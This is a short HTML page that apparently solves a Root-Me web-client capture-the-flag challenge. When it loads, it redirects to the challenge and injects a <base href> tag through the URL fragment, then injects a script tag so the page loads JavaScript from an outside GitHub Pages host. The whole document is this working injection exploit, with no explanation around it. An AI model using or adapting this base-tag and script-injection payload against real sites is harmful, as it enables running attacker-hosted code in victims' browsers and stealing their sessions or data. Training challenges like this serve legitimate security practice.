<!DOCTYPE html>
<html>
<head>
    <title>Challenge</title>
</head>
<body>
<script>
function exploit() {
    const targetUrl = "http://challenge01.root-me.org/web-client/ch62";
    const basePayload = "<base href='https://obonnate.github.io/'>";
    const scriptPayload = "<script src='/web-client/ch62/script.js'><\/script>";
    // Redirect to target with base payload
    location.href = `${targetUrl}#${encodeURI(basePayload)}`;
    // Wait briefly then inject the script tag
    setTimeout(() => {
        location.hash = encodeURIComponent(scriptPayload);
    }, 100);
}
window.onload = exploit;
alert('lo');
</script>
</body>
</html>
